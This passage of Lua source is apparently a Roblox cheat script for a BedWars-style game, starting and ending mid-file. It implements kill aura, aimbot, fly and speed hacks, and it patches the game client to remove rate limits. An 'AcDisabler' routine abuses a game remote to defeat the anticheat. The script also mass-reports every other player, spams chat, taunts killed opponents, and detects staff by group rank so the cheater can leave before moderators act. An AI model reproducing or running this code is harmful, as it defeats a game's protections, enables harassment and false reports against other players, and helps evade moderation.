			SpoofedCamera.Position = Vector3.new(LocalPlayer.Character.PrimaryPart.Position.X, SpoofedCamera.Position.Y + (FlyUp and 0.5 or 0) + (FlyDown and -0.5 or 0), LocalPlayer.Character.PrimaryPart.Position.Z)
			StartLevel = SpoofedCamera.Position.Y	
		until InfiniteFlyValue == false or not IsAlive(LocalPlayer)

		if InfiniteFlyValue == false or not IsAlive(LocalPlayer) then
			LocalPlayer.Character.PrimaryPart.Anchored = true
			LocalPlayer.Character.PrimaryPart.CFrame = SpoofedCamera.CFrame + Vector3.new(0, 5, 0)	
			SetCamera(LocalPlayer.Character)

			SpoofedCamera:Destroy()

			task.wait(0.025)

			WorkSpace.Gravity = 50
			LocalPlayer.Character.PrimaryPart.Anchored = false

			task.wait(1)

			WorkSpace.Gravity = 196.2
		end
	end	
end

local function Nuker(NearestBed, NearestOre)
	if NearestBed then
		local NukerRaycastParameters = RaycastParams.new()
		local TargetBlock = nil

		NukerRaycastParameters.FilterType = Enum.RaycastFilterType.Exclude
		NukerRaycastParameters.FilterDescendantsInstances = {LocalPlayer.Character}
		NukerRaycastParameters.IgnoreWater = true

		local RaycastResult = WorkSpace:Raycast(NearestBed.Position + Vector3.new(0, 30, 0), Vector3.new(0, -35, 0), NukerRaycastParameters)

		if RaycastResult then
			if RaycastResult.Instance then
				TargetBlock = RaycastResult.Instance
			end

			if not RaycastResult.Instance then
				TargetBlock = NearestBed
			end							

			DamageBlockRemote:InvokeServer({
				["blockRef"] = {
					["blockPosition"] = GetServerPosition(TargetBlock.Position)
				},
				["hitPosition"] = GetServerPosition(TargetBlock.Position),
				["hitNormal"] = GetServerPosition(TargetBlock.Position)
			})
		end
	end

	if not NearestBed and NearestOre then
		if Settings.Nuker.BreakOres == true then
			DamageBlockRemote:InvokeServer({
				["blockRef"] = {
					["blockPosition"] = GetServerPosition(NearestOre.Position)
				},
				["hitPosition"] = GetServerPosition(NearestOre.Position),
				["hitNormal"] = GetServerPosition(NearestOre.Position)
			})
		end
	end
end

local function FlyMe()
	local FlyGroundTime = tick()
	
	if FlyValue == true and IsAlive(LocalPlayer) then		
		task.spawn(function()
			local FlyHud, NumberDisplay, SliderDisplay = CreateFlyHud()
			
			repeat
				task.wait()

				if tick() - FlyGroundTime <= 2.5 then
					local MaxFlyTime = 2.5
					local FlyTime = DecimalRound(tick() - FlyGroundTime, 1)

					NumberDisplay.Text = FlyTime		

					local TweenInformation = TweenInfo.new(0.35, Enum.EasingStyle.Sine, Enum.EasingDirection.Out, 0, false, 0)			
					local Tween = TweenService:Create(SliderDisplay, TweenInformation, {Size = UDim2.new(FlyTime / MaxFlyTime, 0, 1, 0)})

					Tween:Play()				
				end				

			until FlyValue == false or not IsAlive(LocalPlayer)

			FlyHud:Destroy()
		end)		
		
		task.spawn(function()
			FlyBodyVelocity = Instance.new("BodyVelocity")
			FlyBodyVelocity.MaxForce = Vector3.new(0, 9e9, 0)
			FlyBodyVelocity.Name = "FlyBodyVelocity"
			FlyBodyVelocity.Parent = LocalPlayer.Character.PrimaryPart

			FlyGroundTime = tick()

			repeat
				task.wait()

				if TouchingGround() then
					FlyGroundTime = tick()
				end

				if FlyValue == true and IsAlive(LocalPlayer) then
					FlyBodyVelocity.Velocity = Vector3.new(0, (FlyUp and 40 or 0) + (FlyDown and -40 or 0), 0)

					if (tick() - FlyGroundTime) >= 2.5 then
						local FlyTeleportPosition = LocalPlayer.Character.PrimaryPart.Position.Y

						local FlyRaycastParameters = RaycastParams.new()

						FlyRaycastParameters.FilterType = Enum.RaycastFilterType.Include
						FlyRaycastParameters.FilterDescendantsInstances = {CollectionService:GetTagged("block")}

						local Raycast = workspace:Raycast(LocalPlayer.Character.PrimaryPart.Position, Vector3.new(0, -1000, 0), FlyRaycastParameters)

						if Raycast and Raycast.Instance and IsAlive(LocalPlayer) then 
							LocalPlayer.Character.PrimaryPart.CFrame = CFrame.new(Raycast.Instance.Position)

							task.wait(0.12)

							if IsAlive(LocalPlayer) then 
								LocalPlayer.Character.PrimaryPart.CFrame = CFrame.new(LocalPlayer.Character.PrimaryPart.Position + (Vector3.new(0, FlyTeleportPosition, 0) - Vector3.new(0, LocalPlayer.Character.PrimaryPart.Position.Y, 0)))

								FlyGroundTime = tick()
							end		
						end
					end
				end
			until FlyValue == false or not IsAlive(LocalPlayer)
			
			if LocalPlayer.Character.PrimaryPart:FindFirstChild("FlyBodyVelocity") then
				LocalPlayer.Character.PrimaryPart:FindFirstChild("FlyBodyVelocity"):Destroy()
				FlyGroundTime = tick()
			end
		end)
	end	
end

task.spawn(function()
	repeat
		task.wait()
		
		if Settings.KillAura.Value == true and IsAlive(LocalPlayer) and GetMatchState() ~= 0 then
			local NearestEntity = FindNearestEntity(Settings.KillAura.Range)
			local Sword = GetSword()

			if NearestEntity and Sword then
				SwordHit(NearestEntity, Sword)
			end
		end
	until not game	
end)

task.spawn(function()
	repeat
		task.wait()

		task.spawn(function()
			if Settings.AimAssist.Value == true and IsAlive(LocalPlayer) and GetMatchState() ~= 0 then
				local NearestEntity = FindNearestEntity(Settings.AimAssist.Range)

				if NearestEntity then
					local LookVector = (NearestEntity.PrimaryPart.Position - Camera.CFrame.Position).unit

					Camera.CFrame = CFrame.new(Camera.CFrame.Position, Camera.CFrame.Position + LookVector)
				end
			end		
		end)
		
		task.spawn(function()		
			if Settings.Aimbot.Value == true and IsAlive(LocalPlayer) and GetMatchState() ~= 0  then	
				local NearestEntity, NearestEntityDistance = FindNearestEntity(math.huge)
				
				local BestBow = GetBow()

				if BestBow and IsAlive(LocalPlayer) and NearestEntity and not NearestEntity:FindFirstChildOfClass("ForceField") and NearestEntityDistance > 18  then
					if Settings.Aimbot.ToolCheck == true then
						if HasItem(BestBow.itemType) and HasItem("arrow") then
							local Bow = HasItem(BestBow.itemType)

							if Bow then
								ShootProjectile(ReplicatedStorage.Inventories:FindFirstChild(LocalPlayer.Name):FindFirstChild(BestBow.itemType), "arrow")
							end
						end
					end

					if Settings.Aimbot.ToolCheck == false then
						local Bow = HasItem(BestBow.itemType)

						if Bow and HasItem("arrow") then
							SwitchItem(BestBow.itemType)

							ShootProjectile(ReplicatedStorage.Inventories:FindFirstChild(LocalPlayer.Name):FindFirstChild(BestBow.itemType), "arrow")
						end
					end
				end

				if not BestBow and IsAlive(LocalPlayer) then
					if HasItem("fireball") then
						ShootProjectile(ReplicatedStorage.Inventories:FindFirstChild(LocalPlayer.Name):FindFirstChild("fireball"), "fireball")
					end

					if HasItem("snowball") then
						ShootProjectile(ReplicatedStorage.Inventories:FindFirstChild(LocalPlayer.Name):FindFirstChild("snowball"), "snowball")
					end
				end
			end
		end)
		
		task.spawn(function()
			local HipHeight = 1.99999

			if Settings.AcDisabler.Value == true and IsAlive(LocalPlayer) then
				local Elk = LocalPlayer.Character:FindFirstChild("elk")

				LocalPlayer.Character.Humanoid.HipHeight = HipHeight
				AnticheatDisabled = true

				if Elk and Elk:FindFirstChild("body_mesh") then
					Elk:FindFirstChild("body_mesh"):Destroy()
					Elk.PrimaryPart:Destroy()
				end

				task.spawn(function()
					local Args = {
						[1] = "elk_summon"
					}

					ElkSummonRemote:FireServer(unpack(Args))
				end)
			end

			if Settings.AcDisabler.Value == false or not IsAlive(LocalPlayer) or not LocalPlayer.Character:FindFirstChild("elk") then
				AnticheatDisabled = false
			end
		end)
		
		task.spawn(function()
			if Settings.Scaffold.Value == true and IsAlive(LocalPlayer) and GetMatchState() ~= 0 then
				for i = 1, Settings.Scaffold.ExpandDistance do
					local ScaffoldCFrame = LocalPlayer.Character.PrimaryPart.Position + (LocalPlayer.Character.Humanoid.MoveDirection * (i * 3.3)) - Vector3.new(0, (LocalPlayer.Character.PrimaryPart.Size.Y / 2) + (LocalPlayer.Character.Humanoid.HipHeight + 1.5), 0)
					local Position = GetServerPosition(ScaffoldCFrame)
					local Block = GetBlock()

					if Block then
						task.spawn(function()
							PlaceBlock(Position, Block)
						end)
					end
				end
			end
		end)
	until not game
end)

task.spawn(function()
	repeat
		task.wait(0.5)

		task.spawn(function()			
			if Settings.NoFall.Value == true and IsAlive(LocalPlayer) and GetMatchState() ~= 0 then
				GroundHitRemote:FireServer()
			end
		end)		

		task.spawn(function()
			if Settings.ChestStealer.Value == true and IsAlive(LocalPlayer) and GetMatchState() ~= 0 then
				local NearestChest = FindNearestChest()

				if NearestChest then
					StealChest(NearestChest)
				end
			end
		end)

		task.spawn(function()
			if Settings.AutoKit.Value == true and IsAlive(LocalPlayer) and GetMatchState() ~= 0 then
				AutoKit()
			end
		end)

		task.spawn(function()
			if Settings.AutoBank.Value == true and IsAlive(LocalPlayer) and GetMatchState() ~= 0 then
				AutoBank()
			end
		end)

		task.spawn(function()
			if Settings.AutoBuy.Value == true and IsAlive(LocalPlayer) and GetMatchState() ~= 0 then
				AutoBuy()
			end			
		end)
	until not game
end)

task.spawn(function()
	repeat
		task.wait(1 / Settings.AutoClicker.Cps)

		if Settings.AutoClicker.Value == true and IsAlive(LocalPlayer) and GetMatchState() ~= 0 then
			task.spawn(function()
				if BlockPlacementController.blockPlacer.clientManager and ClientHandlerStore:getstate().Inventory.observedInventory == "block" then
					local MouseInformation = BlockPlacementController.blockPlacer.clientManager:getBlockSelector():getMouseInfo(0)
					
					if MouseInformation then
						BlockPlacementController.blockPlacer:placeBlock(MouseInformation.placementPosition)
					end
				end
			end)

			task.spawn(function()
				SwordController:swingSwordAtMouse()
			end)
		end
	until not game
end)

task.spawn(function()
	repeat
		task.wait(100 / Settings.ChatSpammer.Speed)

		task.spawn(function()
			if Settings.ChatSpammer.Value == true and GetMatchState() ~= 0 then
				ChatSpam()
			end
		end)
	until not game	
end)

task.spawn(function()
	local ReportedList = {}

	repeat
		task.wait()

		if Settings.AutoReport.Value == true then
			for i, v in next, PlayerService:GetPlayers() do
				if v ~= LocalPlayer and v:GetAttribute("PlayerConnected") and ReportedList[v] == nil then
					ReportRemote:FireServer(v.UserId)
					ReportedList[v] = true

					task.wait(1)
				end
			end
		end	
	until not game
end)

task.spawn(function()
	PlayerService.PlayerAdded:Connect(function(Player)
		if Player:IsInGroup(5774246) and Player:GetRankInGroup(5774246) >= 2 then

			task.spawn(function()
				if Settings.AntiStaff.Kick == true then
					LocalPlayer:Kick("A staff has joined your game!")
				end
				
				CreateNotification(60,  "A staff has joined your game!")	
			end)
		end
	end)
	
	task.spawn(function()
		task.wait(5)
		
		for i, v in next, PlayerService:GetPlayers() do
			if v:IsInGroup(5774246) and v:GetRankInGroup(5774246) >= 2 then

				task.spawn(function()
					task.spawn(function()
						if Settings.AntiStaff.Kick == true then
							LocalPlayer:Kick("A staff has joined your game!")
						end
					end)
					
					CreateNotification(60,  "A staff has joined your game!")	
				end)								
			end
		end
	end)
end)

task.spawn(function()
	repeat task.wait() until GetMatchState() ~= 0

	task.wait(0.3)

	for i, v in next, PlayerService:GetPlayers() do
		if IsAlive(v) then
			v.Character.Humanoid.HealthChanged:Connect(function(Health)
				if Health <= 0 and v.Team ~= LocalPlayer.Team and v ~= LocalPlayer and Settings.AutoToxic.Value == true then
					AutoToxic(v)
				end
			end)
		end	

		task.spawn(function()
			v.CharacterAdded:Connect(function(Character)
				task.wait(0.3)

				local v = PlayerService:FindFirstChild(Character.Name) or v

				if IsAlive(v) then
					v.Character.Humanoid.HealthChanged:Connect(function(Health)
						if Health <= 0 and v.Team ~= LocalPlayer.Team and v ~= LocalPlayer and Settings.AutoToxic.Value == true then
							AutoToxic(v)
						end
					end)
				end
			end)
		end)
	end
end)

task.spawn(function()	
	Client:WaitFor("EntityDamageEvent"):andThen(function(v)
		v:Connect(function(Player) 
			if Player.entityInstance == LocalPlayer.Character and Settings.DamageBoost.Value == true and IsAlive(LocalPlayer) and GetMatchState() ~= 0 then 
				task.spawn(function()
					DamageBoost = true

					task.wait(0.8)

					DamageBoost = false	
				end) 
			end 
		end)    
	end)
end)

task.spawn(function()
	task.spawn(function()
		if GetQueueType():find("skywars") then
			repeat task.wait(1) until not IsAlive(LocalPlayer)

			PlayAgainRemote.joinQueue:FireServer({["queueType"] = GetQueueType()})
		end
	end)

	repeat task.wait(1) until GetMatchState() == 2

	if Settings.PlayAgain.Value == true then
		PlayAgainRemote.joinQueue:FireServer({["queueType"] = GetQueueType()})
	end
end)

task.spawn(function()
	RunService.Heartbeat:Connect(function(Delta)
		if Settings.Speed.Value == true and IsAlive(LocalPlayer) then			
			local SpeedValue = GetSpeed()

			local SpeedRaycastParameters = RaycastParams.new()
			
			SpeedRaycastParameters.FilterDescendantsInstances = {LocalPlayer.Character}

			local SpeedCFrame = LocalPlayer.Character.Humanoid.MoveDirection * SpeedValue * Delta

			local Raycast = WorkSpace:Raycast(LocalPlayer.Character.PrimaryPart.Position, SpeedCFrame, SpeedRaycastParameters)

			if Raycast then
				SpeedCFrame = (Raycast.Position - LocalPlayer.Character.PrimaryPart.Position) 

				LocalPlayer.Character.PrimaryPart.CFrame = LocalPlayer.Character.PrimaryPart.CFrame - SpeedCFrame
			end

			if not Raycast then
				LocalPlayer.Character.PrimaryPart.CFrame = LocalPlayer.Character.PrimaryPart.CFrame + SpeedCFrame
			end			
		end
	end)
end)

task.spawn(function()
	repeat
		task.wait(0.1)			

		if Settings.Nuker.Value == true and IsAlive(LocalPlayer) and GetMatchState() ~= 0 then
			local NearestBed = FindNearestBed(Settings.Nuker.Range) or nil
			local NearestOre = FindNearestOre(Settings.Nuker.Range) or nil
			
			if NearestBed or NearestOre then
				Nuker(NearestBed, NearestOre)
			end			
		end
	until not game
end)

task.spawn(function()
	repeat task.wait() until GetMatchState() ~= 0

	local ZephyrUpdate = ZephyrController.updateJump

	ZephyrController.updateJump = function(self, orb, ...)
		if IsAlive(LocalPlayer) and orb then
			ZephyrOrb = 1
		end

		if not IsAlive(LocalPlayer) or not orb then
			ZephyrOrb = 0
		end

		return ZephyrUpdate(self, orb, ...)
	end
end)

task.spawn(function()
	repeat
		task.wait(0.01)

		if IsAlive(LocalPlayer) and IsMoving() and LocalPlayer.Character:FindFirstChild("Cape") and LocalPlayer.Character:FindFirstChild("Cape"):FindFirstChild("Motor") then
			local TweenInformation = TweenInfo.new(0.15, Enum.EasingStyle.Linear, Enum.EasingDirection.In, 0, false, 0)
			local CapeTween = TweenService:Create(LocalPlayer.Character.Cape.Motor, TweenInformation, {CurrentAngle = -0.6})

			CapeTween:Play()
		end

		if IsAlive(LocalPlayer) and not IsMoving() and LocalPlayer.Character:FindFirstChild("Cape") and LocalPlayer.Character:FindFirstChild("Cape"):FindFirstChild("Motor") then
			local TweenInformation = TweenInfo.new(0.15, Enum.EasingStyle.Linear, Enum.EasingDirection.In, 0, false, 0)
			local CapeTween = TweenService:Create(LocalPlayer.Character.Cape.Motor, TweenInformation, {CurrentAngle = -0.2})

			CapeTween:Play()
		end
	until not game
end)

task.spawn(function()
	UserInputService.InputBegan:Connect(function(Input)
		if Input.KeyCode == Enum.KeyCode.Space and not UserInputService:GetFocusedTextBox() then
			FlyUp = true
		end

		if Input.KeyCode == Enum.KeyCode.LeftShift and not UserInputService:GetFocusedTextBox() then
			FlyDown = true
		end
	end)

	UserInputService.InputEnded:Connect(function(Input)
		if Input.KeyCode == Enum.KeyCode.Space and not UserInputService:GetFocusedTextBox() then
			FlyUp = false
		end

		if Input.KeyCode == Enum.KeyCode.LeftShift and not UserInputService:GetFocusedTextBox() then
			FlyDown = false
		end
	end)
end)

local CombatTab = CreateTab("Combat")
local BlatantTab = CreateTab("Blatant")
local UtilityTab = CreateTab("Utility")
local WorldTab = CreateTab("World")

task.spawn(function()
	local NoKnockBack, DropDownButton, LayoutOrder, UIGradient = CreateToggle(CombatTab, "NoKnockBack", Settings.NoKnockBack.Value, function(CallBack)
		Settings.NoKnockBack.Value = CallBack

		local OldKnockBackDirection = KnockBackTable.kbDirectionStrength
		local OldKnockBackUp = KnockBackTable.kbUpwardStrength

		if Settings.NoKnockBack.Value == true then
			KnockBackTable.kbDirectionStrength = 0
			KnockBackTable.kbUpwardStrength = 0	
		end

		if Settings.NoKnockBack.Value == false then
			KnockBackTable.kbDirectionStrength = OldKnockBackDirection
			KnockBackTable.kbUpwardStrength = OldKnockBackUp
		end
	end)

	task.spawn(function()
		local InstanceUI
		local Value = false

		DropDownButton.Activated:Connect(function()
			Value = not Value

			if Value == true then
				InstanceUI = CreateKeyBind(CombatTab, Settings.NoKnockBack.KeyBind, LayoutOrder + 1, function(CallBack)
					Settings.NoKnockBack.KeyBind = CallBack
				end)
			end

			if Value == false then
				InstanceUI:Destroy()
			end
		end)
	end)

	task.spawn(function()
		UserInputService.InputBegan:Connect(function(Input)
			if not UserInputService:GetFocusedTextBox() then
				if Input.KeyCode.Name == Settings.NoKnockBack.KeyBind then
					Settings.NoKnockBack.Value = not Settings.NoKnockBack.Value

					if Settings.NoKnockBack.Value == true then
						UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(0.635294, 0.313725, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(0.831373, 0.686275, 1))}
					end

					if Settings.NoKnockBack.Value == false then
						UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(1, 1, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(1, 1, 1))}
					end
				end
			end
		end)
	end)
end)

task.spawn(function()
	local AutoClicker, DropDownButton, LayoutOrder, UIGradient = CreateToggle(CombatTab, "AutoClicker", Settings.AutoClicker.Value, function(CallBack)
		Settings.AutoClicker.Value = CallBack

		local OldCpsFunction = nil

		if Settings.AutoClicker.Value == true then
			SwordController.isClickingTooFast = function(self) 
				self.lastSwing = tick()

				return false 
			end
		end

		if Settings.AutoClicker.Value == false then
			SwordController.isClickingTooFast = OldCpsFunction
		end
	end)

	task.spawn(function()
		local InstanceUI
		local Value = false

		DropDownButton.Activated:Connect(function()
			Value = not Value

			if Value == true then
				InstanceUI = CreateKeyBind(CombatTab, Settings.AutoClicker.KeyBind, LayoutOrder + 1, function(CallBack)
					Settings.AutoClicker.KeyBind = CallBack
				end)
			end

			if Value == false then
				InstanceUI:Destroy()
			end
		end)
	end)

	task.spawn(function()
		UserInputService.InputBegan:Connect(function(Input)
			if not UserInputService:GetFocusedTextBox() then
				if Input.KeyCode.Name == Settings.AutoClicker.KeyBind then
					Settings.AutoClicker.Value = not Settings.AutoClicker.Value

					if Settings.AutoClicker.Value == true then
						UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(0.635294, 0.313725, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(0.831373, 0.686275, 1))}
					end

					if Settings.AutoClicker.Value == false then
						UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(1, 1, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(1, 1, 1))}
					end
				end
			end
		end)
	end)

	task.spawn(function()
		local InstanceUI
		local Value = false

		DropDownButton.Activated:Connect(function()
			Value = not Value

			if Value == true then
				InstanceUI = CreateSlider(CombatTab, "Cps", Settings.AutoClicker.Cps, 30, LayoutOrder + 2, function(CallBack)
					Settings.AutoClicker.Cps = CallBack
				end)
			end

			if Value == false then
				InstanceUI:Destroy()
			end
		end)
	end)
end)

task.spawn(function()
	local AimAssist, DropDownButton, LayoutOrder, UIGradient = CreateToggle(CombatTab, "AimAssist", Settings.AimAssist.Value, function(CallBack)
		Settings.AimAssist.Value = CallBack
	end)

	task.spawn(function()
		local InstanceUI
		local Value = false

		DropDownButton.Activated:Connect(function()
			Value = not Value

			if Value == true then
				InstanceUI = CreateKeyBind(CombatTab, Settings.AimAssist.KeyBind, LayoutOrder + 1, function(CallBack)
					Settings.AimAssist.KeyBind = CallBack
				end)
			end

			if Value == false then
				InstanceUI:Destroy()
			end
		end)
	end)

	task.spawn(function()
		UserInputService.InputBegan:Connect(function(Input)
			if not UserInputService:GetFocusedTextBox() then
				if Input.KeyCode.Name == Settings.AimAssist.KeyBind then
					Settings.AimAssist.Value = not Settings.AimAssist.Value

					if Settings.AimAssist.Value == true then
						UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(0.635294, 0.313725, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(0.831373, 0.686275, 1))}
					end

					if Settings.AimAssist.Value == false then
						UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(1, 1, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(1, 1, 1))}
					end
				end
			end
		end)
	end)
	
	task.spawn(function()
		local InstanceUI
		local Value = false

		DropDownButton.Activated:Connect(function()
			Value = not Value

			if Value == true then
				InstanceUI = CreateSlider(CombatTab, "Range", Settings.AimAssist.Range, 18, LayoutOrder + 1, function(CallBack)
					Settings.AimAssist.Range = CallBack
				end)
			end

			if Value == false then
				InstanceUI:Destroy()
			end
		end)
	end)
end)

task.spawn(function()
	local KillAura, DropDownButton, LayoutOrder, UIGradient = CreateToggle(CombatTab, "KillAura", Settings.KillAura.Value, function(CallBack)
		Settings.KillAura.Value = CallBack
	end)

	task.spawn(function()
		local InstanceUI
		local Value = false

		DropDownButton.Activated:Connect(function()
			Value = not Value

			if Value == true then
				InstanceUI = CreateKeyBind(CombatTab, Settings.KillAura.KeyBind, LayoutOrder + 1, function(CallBack)
					Settings.KillAura.KeyBind = CallBack
				end)
			end

			if Value == false then
				InstanceUI:Destroy()
			end
		end)
	end)

	task.spawn(function()
		UserInputService.InputBegan:Connect(function(Input)
			if not UserInputService:GetFocusedTextBox() then
				if Input.KeyCode.Name == Settings.KillAura.KeyBind then
					Settings.KillAura.Value = not Settings.KillAura.Value

					if Settings.KillAura.Value == true then
						UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(0.635294, 0.313725, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(0.831373, 0.686275, 1))}
					end

					if Settings.KillAura.Value == false then
						UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(1, 1, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(1, 1, 1))}
					end
				end
			end
		end)
	end)

	task.spawn(function()
		local InstanceUI
		local Value = false

		DropDownButton.Activated:Connect(function()
			Value = not Value

			if Value == true then
				InstanceUI = CreateMiniToggle(CombatTab, "CustomAnimation", Settings.KillAura.CustomAnimation, LayoutOrder + 2, function(CallBack)
					Settings.KillAura.CustomAnimation = CallBack
				end)
			end

			if Value == false then
				InstanceUI:Destroy()
			end
		end)
	end)

	task.spawn(function()
		local InstanceUI
		local Value = false

		DropDownButton.Activated:Connect(function()
			Value = not Value

			if Value == true then
				InstanceUI = CreateMiniToggle(CombatTab, "ToolCheck", Settings.KillAura.ToolCheck, LayoutOrder + 3, function(CallBack)
					Settings.KillAura.ToolCheck = CallBack
				end)
			end

			if Value == false then
				InstanceUI:Destroy()
			end
		end)
	end)

	task.spawn(function()
		local InstanceUI
		local Value = false

		DropDownButton.Activated:Connect(function()
			Value = not Value

			if Value == true then
				InstanceUI = CreateSlider(CombatTab, "Range", Settings.KillAura.Range, 20, LayoutOrder + 4, function(CallBack)
					Settings.KillAura.Range = CallBack
				end)
			end

			if Value == false then
				InstanceUI:Destroy()
			end
		end)
	end)
end)

task.spawn(function()
	local Reach, DropDownButton, LayoutOrder, UIGradient = CreateToggle(CombatTab, "Reach", Settings.Reach.Value, function(CallBack)
		Settings.Reach.Value = CallBack

		local OldReach = CombatConstant.RAYCAST_SWORD_CHARACTER_DISTANCE

		if Settings.Reach.Value == true then
			CombatConstant.RAYCAST_SWORD_CHARACTER_DISTANCE = 20
		end

		if Settings.Reach.Value == false then
			CombatConstant.RAYCAST_SWORD_CHARACTER_DISTANCE = OldReach
		end
	end)

	task.spawn(function()
		local InstanceUI
		local Value = false

		DropDownButton.Activated:Connect(function()
			Value = not Value

			if Value == true then
				InstanceUI = CreateKeyBind(CombatTab, Settings.Reach.KeyBind, LayoutOrder + 1, function(CallBack)
					Settings.Reach.KeyBind = CallBack
				end)
			end

			if Value == false then
				InstanceUI:Destroy()
			end
		end)
	end)

	task.spawn(function()
		UserInputService.InputBegan:Connect(function(Input)
			if not UserInputService:GetFocusedTextBox() then
				if Input.KeyCode.Name == Settings.Reach.KeyBind then
					Settings.Reach.Value = not Settings.Reach.Value

					if Settings.Reach.Value == true then
						UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(0.635294, 0.313725, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(0.831373, 0.686275, 1))}
					end

					if Settings.Reach.Value == false then
						UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(1, 1, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(1, 1, 1))}
					end
				end
			end
		end)
	end)
end)

task.spawn(function()
	local Sprint, DropDownButton, LayoutOrder, UIGradient = CreateToggle(CombatTab, "Sprint", Settings.Sprint.Value, function(CallBack)
		Settings.Sprint.Value = CallBack

		local OldSprintFunction

		if Settings.Sprint.Value == true then
			OldSprintFunction = SprintController.stopSprinting

			SprintController.stopSprinting = function(...)
				local Function = OldSprintFunction(...)

				SprintController:startSprinting()
				return Function
			end

			task.spawn(function()
				SprintController:startSprinting()
			end)

			LocalPlayer.CharacterAdded:Connect(function()
				SprintController:stopSprinting()
			end)
		end

		if Settings.Sprint.Value == false then
			SprintController.stopSprinting = OldSprintFunction
			SprintController:stopSprinting()
		end
	end)

	task.spawn(function()
		local InstanceUI
		local Value = false

		DropDownButton.Activated:Connect(function()
			Value = not Value

			if Value == true then
				InstanceUI = CreateKeyBind(CombatTab, Settings.Sprint.KeyBind, LayoutOrder + 1, function(CallBack)
					Settings.Sprint.KeyBind = CallBack
				end)
			end

			if Value == false then
				InstanceUI:Destroy()
			end
		end)
	end)

	task.spawn(function()
		UserInputService.InputBegan:Connect(function(Input)
			if not UserInputService:GetFocusedTextBox() then
				if Input.KeyCode.Name == Settings.Sprint.KeyBind then
					Settings.Sprint.Value = not Settings.Sprint.Value

					if Settings.Sprint.Value == true then
						UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(0.635294, 0.313725, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(0.831373, 0.686275, 1))}
					end

					if Settings.Sprint.Value == false then
						UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(1, 1, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(1, 1, 1))}
					end
				end
			end
		end)
	end)
end)

task.spawn(function()
	local NoPlacementCps, DropDownButton, LayoutOrder, UIGradient = CreateToggle(BlatantTab, "NoPlacementCps", Settings.NoPlacementCps.Value, function(CallBack)
		Settings.NoPlacementCps.Value = CallBack

		local OldCps = nil

		if Settings.NoPlacementCps.Value == true then
			OldCps = PlacementCPS.BLOCK_PLACE_CPS

			PlacementCPS.BLOCK_PLACE_CPS = math.huge
		end

		if Settings.NoPlacementCps.Value == false then
			PlacementCPS.BLOCK_PLACE_CPS = OldCps
		end
	end)

	task.spawn(function()
		local InstanceUI
		local Value = false

		DropDownButton.Activated:Connect(function()
			Value = not Value

			if Value == true then
				InstanceUI = CreateKeyBind(BlatantTab, Settings.NoPlacementCps.KeyBind, LayoutOrder + 1, function(CallBack)
					Settings.NoPlacementCps.KeyBind = CallBack
				end)
			end

			if Value == false then
				InstanceUI:Destroy()
			end
		end)
	end)

	task.spawn(function()
		UserInputService.InputBegan:Connect(function(Input)
			if not UserInputService:GetFocusedTextBox() then
				if Input.KeyCode.Name == Settings.NoPlacementCps.KeyBind then
					Settings.NoPlacementCps.Value = not Settings.NoPlacementCps.Value

					if Settings.NoPlacementCps.Value == true then
						UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(0.635294, 0.313725, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(0.831373, 0.686275, 1))}
					end

					if Settings.NoPlacementCps.Value == false then
						UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(1, 1, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(1, 1, 1))}
					end
				end
			end
		end)
	end)
end)

task.spawn(function()
	local ChestStealer, DropDownButton, LayoutOrder, UIGradient = CreateToggle(BlatantTab, "ChestStealer", Settings.ChestStealer.Value, function(CallBack)
		Settings.ChestStealer.Value = CallBack
	end)

	task.spawn(function()
		local InstanceUI
		local Value = false

		DropDownButton.Activated:Connect(function()
			Value = not Value

			if Value == true then
				InstanceUI = CreateKeyBind(BlatantTab, Settings.ChestStealer.KeyBind, LayoutOrder + 1, function(CallBack)
					Settings.ChestStealer.KeyBind = CallBack
				end)
			end

			if Value == false then
				InstanceUI:Destroy()
			end
		end)
	end)

	task.spawn(function()
		UserInputService.InputBegan:Connect(function(Input)
			if not UserInputService:GetFocusedTextBox() then
				if Input.KeyCode.Name == Settings.ChestStealer.KeyBind then
					Settings.ChestStealer.Value = not Settings.ChestStealer.Value

					if Settings.ChestStealer.Value == true then
						UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(0.635294, 0.313725, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(0.831373, 0.686275, 1))}
					end

					if Settings.ChestStealer.Value == false then
						UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(1, 1, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(1, 1, 1))}
					end
				end
			end
		end)
	end)

	task.spawn(function()
		local InstanceUI
		local Value = false

		DropDownButton.Activated:Connect(function()
			Value = not Value

			if Value == true then
				InstanceUI = CreateSlider(BlatantTab, "Range", Settings.ChestStealer.Range, 30, LayoutOrder + 2, function(CallBack)
					Settings.ChestStealer.Range = CallBack
				end)
			end

			if Value == false then
				InstanceUI:Destroy()
			end
		end)
